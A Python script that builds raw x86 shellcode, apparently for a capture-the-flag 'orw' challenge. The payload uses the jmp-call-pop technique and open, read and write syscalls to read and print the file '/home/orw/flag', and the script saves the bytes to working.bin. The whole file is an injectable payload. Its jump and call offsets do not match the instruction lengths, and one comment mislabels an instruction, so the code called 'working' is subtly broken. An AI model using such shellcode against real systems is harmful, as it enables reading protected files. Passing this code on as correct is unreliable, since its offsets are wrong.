#!/usr/bin/env python3

def create_working_shellcode():
    # Use a different approach - create the string properly
    shellcode = []
    
    # First, let's try a simple approach with a known working pattern
    # We'll use the jmp-call-pop technique
    
    # jmp to the call instruction (skip the string)
    shellcode.extend([0xeb, 0x1a])  # jmp $+0x1a
    
    # call instruction (this pushes the address of the next instruction)
    shellcode.extend([0x5e])  # pop %esi (get string address)
    
    # open("/home/orw/flag", O_RDONLY)
    # mov %esi, %ebx (filename pointer)
    shellcode.extend([0x89, 0xf3])
    
    # mov $0, %ecx (O_RDONLY)
    shellcode.extend([0xb9, 0x00, 0x00, 0x00, 0x00])
    
    # mov $5, %eax (sys_open)
    shellcode.extend([0xb8, 0x05, 0x00, 0x00, 0x00])
    
    # int $0x80
    shellcode.extend([0xcd, 0x80])
    
    # read(fd, buffer, size)
    # mov %eax, %ebx (file descriptor)
    shellcode.extend([0x89, 0xc3])
    
    # mov %esp, %ecx (buffer pointer)
    shellcode.extend([0x89, 0xe1])
    
    # sub $0x100, %ecx (allocate buffer space)
    shellcode.extend([0x81, 0xe9, 0x00, 0x01, 0x00, 0x00])
    
    # mov $100, %edx (size)
    shellcode.extend([0xba, 0x64, 0x00, 0x00, 0x00])
    
    # mov $3, %eax (sys_read)
    shellcode.extend([0xb8, 0x03, 0x00, 0x00, 0x00])
    
    # int $0x80
    shellcode.extend([0xcd, 0x80])
    
    # write(stdout, buffer, size)
    # mov $1, %ebx (stdout)
    shellcode.extend([0xbb, 0x01, 0x00, 0x00, 0x00])
    
    # ecx and edx already have correct values
    # mov $4, %eax (sys_write)
    shellcode.extend([0xb8, 0x04, 0x00, 0x00, 0x00])
    
    # int $0x80
    shellcode.extend([0xcd, 0x80])
    
    # exit
    # mov $1, %eax (sys_exit)
    shellcode.extend([0xb8, 0x01, 0x00, 0x00, 0x00])
    
    # mov $0, %ebx (exit code)
    shellcode.extend([0xbb, 0x00, 0x00, 0x00, 0x00])
    
    # int $0x80
    shellcode.extend([0xcd, 0x80])
    
    # call instruction (this pushes the address of the next instruction)
    shellcode.extend([0xe8, 0xe1, 0xff, 0xff, 0xff])  # call $-0x1f
    
    # String "/home/orw/flag\0"
    shellcode.extend([0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x6f, 0x72, 0x77, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00])
    
    return shellcode

if __name__ == "__main__":
    shellcode = create_working_shellcode()
    
    print("Working shellcode bytes:")
    print(''.join(f'\\x{b:02x}' for b in shellcode))
    
    print(f"\nLength: {len(shellcode)} bytes")
    
    # Write to file
    with open('working.bin', 'wb') as f:
        f.write(bytes(shellcode))
    
    print("Working shellcode written to working.bin")